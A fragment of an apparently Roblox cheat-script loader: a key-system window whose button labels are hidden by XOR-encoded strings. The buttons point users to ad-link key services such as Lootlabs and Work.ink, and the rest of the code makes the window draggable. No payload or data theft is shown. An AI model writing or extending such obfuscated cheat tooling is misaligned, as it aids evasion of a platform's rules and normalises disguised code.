MakeButton((function()local f2v0P=unpack or table.unpack;local Sbvk7h59o={44,14,31,75,32,14,18,75,137,235,255,75,95,83,75,3,4,30,25,24,75,169,220,75,39,4,4,31,7,10,9,24};for i=1,#Sbvk7h59o do Sbvk7h59o[i]=bit32.bxor(Sbvk7h59o[i],107) end;return string.char(f2v0P(Sbvk7h59o))end)(), 300, false, function()
    getLootlabsLink(5, (function()local o0Ys=unpack or table.unpack;local e8gXRwRm={7,4,4,31,7,10,9,24};for i=1,#e8gXRwRm do e8gXRwRm[i]=bit32.bxor(e8gXRwRm[i],107) end;return string.char(o0Ys(e8gXRwRm))end)())
end)
local DividerLbl = Instance.new((function()local Jq2e48=unpack or table.unpack;local F9eGWQ={63,14,19,31,39,10,9,14,7};for i=1,#F9eGWQ do F9eGWQ[i]=bit32.bxor(F9eGWQ[i],107) end;return string.char(Jq2e48(F9eGWQ))end)())
DividerLbl.Size = UDim2.new(1, -40, 0, 16)
DividerLbl.Position = UDim2.fromOffset(20, 355)
DividerLbl.BackgroundTransparency = 1
DividerLbl.Font = Enum.Font.Gotham
DividerLbl.TextSize = 11
DividerLbl.Text = (function()local O9rqI=unpack or table.unpack;local ZHHF5xa={137,235,255,75,4,25,75,29,2,10,75,60,4,25,0,69,2,5,0,75,137,235,255};for i=1,#ZHHF5xa do ZHHF5xa[i]=bit32.bxor(ZHHF5xa[i],107) end;return string.char(O9rqI(ZHHF5xa))end)()
DividerLbl.TextColor3 = Color3.fromRGB(107, 114, 128)
DividerLbl.TextXAlignment = Enum.TextXAlignment.Center
DividerLbl.Parent = KeyFrame
MakeButton((function()local Ox6xUI=unpack or table.unpack;local mBm2GflrGl={44,14,31,75,32,14,18,75,137,235,255,75,90,89,75,3,4,30,25,24,75,169,220,75,60,4,25,0,69,2,5,0};for i=1,#mBm2GflrGl do mBm2GflrGl[i]=bit32.bxor(mBm2GflrGl[i],107) end;return string.char(Ox6xUI(mBm2GflrGl))end)(), 380, false, function()
    getLootlabsLink(2, (function()local LimJr2=unpack or table.unpack;local G5CeCy={28,4,25,0,2,5,0};for i=1,#G5CeCy do G5CeCy[i]=bit32.bxor(G5CeCy[i],107) end;return string.char(LimJr2(G5CeCy))end)())
end)
MakeButton((function()local Us9k3=unpack or table.unpack;local cmYx3tY59={44,14,31,75,32,14,18,75,137,235,255,75,89,95,75,3,4,30,25,24,75,169,220,75,60,4,25,0,69,2,5,0};for i=1,#cmYx3tY59 do cmYx3tY59[i]=bit32.bxor(cmYx3tY59[i],107) end;return string.char(Us9k3(cmYx3tY59))end)(), 430, false, function()
    getLootlabsLink(3, (function()local K7q6w0=unpack or table.unpack;local w59m2qX={28,4,25,0,2,5,0};for i=1,#w59m2qX do w59m2qX[i]=bit32.bxor(w59m2qX[i],107) end;return string.char(K7q6w0(w59m2qX))end)())
end)
MakeButton((function()local T_8H=unpack or table.unpack;local LDR76hxo4j={44,14,31,75,32,14,18,75,137,235,255,75,95,83,75,3,4,30,25,24,75,169,220,75,60,4,25,0,69,2,5,0};for i=1,#LDR76hxo4j do LDR76hxo4j[i]=bit32.bxor(LDR76hxo4j[i],107) end;return string.char(T_8H(LDR76hxo4j))end)(), 480, false, function()
    getLootlabsLink(5, (function()local Kdwm=unpack or table.unpack;local gtLbr0W={28,4,25,0,2,5,0};for i=1,#gtLbr0W do gtLbr0W[i]=bit32.bxor(gtLbr0W[i],107) end;return string.char(Kdwm(gtLbr0W))end)())
end)
KeyFrame.Size = UDim2.fromOffset(0, 0)
KeyFrame.BackgroundTransparency = 1
TweenService:Create(Blur, TweenInfo.new(0.5), {BackgroundTransparency = 0.6}):Play()
TweenService:Create(KeyFrame, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.fromOffset(420, 560),
    BackgroundTransparency = 0
}):Play()
local UIS = cloneref(game:GetService((function()local ZQyh=unpack or table.unpack;local nnYRDGpd5={62,24,14,25,34,5,27,30,31,56,14,25,29,2,8,14};for i=1,#nnYRDGpd5 do nnYRDGpd5[i]=bit32.bxor(nnYRDGpd5[i],107) end;return string.char(ZQyh(nnYRDGpd5))end)()))
local dragging = false
local dragStart, startPos
Title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = KeyFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        KeyFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                                       startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)